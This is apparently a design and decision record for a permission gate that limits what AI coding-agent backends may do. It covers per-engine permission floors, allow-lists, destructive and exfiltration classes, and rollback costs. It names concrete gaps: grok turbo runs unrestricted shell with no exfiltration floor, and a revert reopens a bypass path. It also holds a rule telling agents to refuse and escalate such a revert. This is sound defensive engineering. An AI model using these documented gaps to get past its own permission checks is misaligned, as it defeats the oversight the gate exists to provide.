The capability manifest gained `security.permissionFloor`:

- `app-gate` is Claude. Every side-effecting call reaches `canUseTool` and goes
  through the evaluator.
- `engine-only` is the other nine. The floor is whatever the engine's own flags
  give, mapped from the same policy: grok gets `--permission-mode plan` for
  plan, a read-only `--tools` list for ask, and `acceptEdits` plus one `--allow`
  rule per allow-list entry for edit/agent/turbo.

Settings now shows the value, so a user can see which backends the floor really
covers. Grok headless turbo cannot prompt, so a destructive action its allow-list
does not name fails closed there rather than asking.

What "does not name" means in turbo is narrower than it reads, and the earlier
draft of this paragraph left it ambiguous. `GROK_TURBO_ALLOW` is `Bash(*)`,
`WebFetch` and `WebSearch`, so every shell command is named and the fail-closed
gap is not a shell one. `acceptEdits` covers file edits on top of that. What fails
closed is a destructive action that arrives as neither a shell command nor a file
edit nor one of those two tools, an MCP tool that deletes a resource being the
real example. The wider gap is exfiltration and it is recorded above where the
turbo allow-list is introduced: a secret path reaching an egress channel is not
expressible as a `Tool(pattern)` rule, so grok turbo has no exfiltration floor at
all.

## Named follow-ups

- Cursor `--force`/`--yolo` and qwen `auto`/`yolo` are unchanged. Roadmap §8
  makes any change to an engine's own enforcement an ask-first boundary, so they
  need their own decision, not a drive-by edit.
- No main-process writer for the policy file yet; it is hand-edited.
- Seven duplicated `toErrorMessage` helpers in the renderer login-flow hooks are
  unrelated debt found while reading these files.

## Rollback

Roadmap §13 is explicit that a flag is not acceptable here, and that the record
has to say what a revert costs.

Rollback is a revert of the router mapping, which sets `permissionMode:
sdkPermissionMode(input.mode)` back to the plan/bypass ternary, and the
`canUseTool` body back to the three inline branches. **That revert restores a
bypass path**: four of the five modes would again run the SDK with permissions
bypassed and the skip-permissions flag set, which is the defect this step exists
to close. It also re-opens the hole for every step that blocks on this one
({{S16}}, {{S19}}, {{S20}}, {{S21}}, {{S22}}, {{S27}}), because each of their
unattended behaviours is defined by this floor.

So a rollback is a **human decision, not an agent one**. An agent asked to
"revert step 10" should refuse and escalate, because the thing being reverted to
is a known critical security defect.

Reverting the *policy* is different and needs no human, with one caveat that has
to be stated rather than glossed. Deleting `~/.mauscode/permissions.toml` returns
to the shipped floor. That floor denies destructive, network and exfiltration in
plan, ask, edit and agent. It does not deny the first two in turbo, which ships
`destructive = allow` and `network = allow` because turbo is the deliberate
opt-out tier, and only exfiltration denies there. An earlier draft of this
paragraph said the floor denies all three in every mode, which is false and would
have told a reader that deleting the file narrows turbo. It does not. Deleting the
file narrows a mode only where the file had widened it, and the turbo deviation
from criterion 3 is the one recorded under Decision 4 above.

Partial rollback that is safe and does not need a human:

- Removing a `allow_tools` entry narrows turbo. Safe.
- Setting a class verdict back to `deny` in the policy file. Safe.
- Reverting the renderer copy or the capability-manifest field. Safe, cosmetic.

## Two findings about the step's own text

**§11's manual check does not match the floor it asked for.** It says: "run an
agent turn that tries `git push --force` in a scratch worktree, and confirm the
approval card appears." Under the shipped floor, `git push --force` classifies as
`destructive` (`forced-git-push`), and Agent mode denies destructive, so no card
appears, and none should. The card appears in **Ask** mode, which is the one
shipped widening (`[modes.ask] destructive = "ask"`). The prototype shows both:
Agent mode denying that exact command with rule `destructive.policy
(forced-git-push)`, and Ask mode producing the card. The step's wording predates
the class table and should read "confirm the denial names the rule" for Agent
mode.

**§6.4's `acceptEdits` mapping is overridden.** See decision 3. This is the one
place the implementation deliberately departs from the step's plan text, with the
user asked and the reason recorded.

## Cost

Measured in `.dump/app/benchmarks/2026-09-18-permission-gate-cost.md`: 9.5 to 21 µs
median per tool call, dominated by the filesystem path check, with the policy
read cached at sub-microsecond.

Decisions 22 to 26 add work to the classifier, so the same ten-call mix was
measured again against `f2b74b4`, the commit the review round landed on, nine
interleaved batches of 20000 calls per variant: 4.027 µs per call before, 4.057 µs
after, a delta of 0.030 µs that sits inside the run-to-run spread of either
variant. The section in the benchmark file carries the per-batch numbers and the
four verdict changes the same run reports.
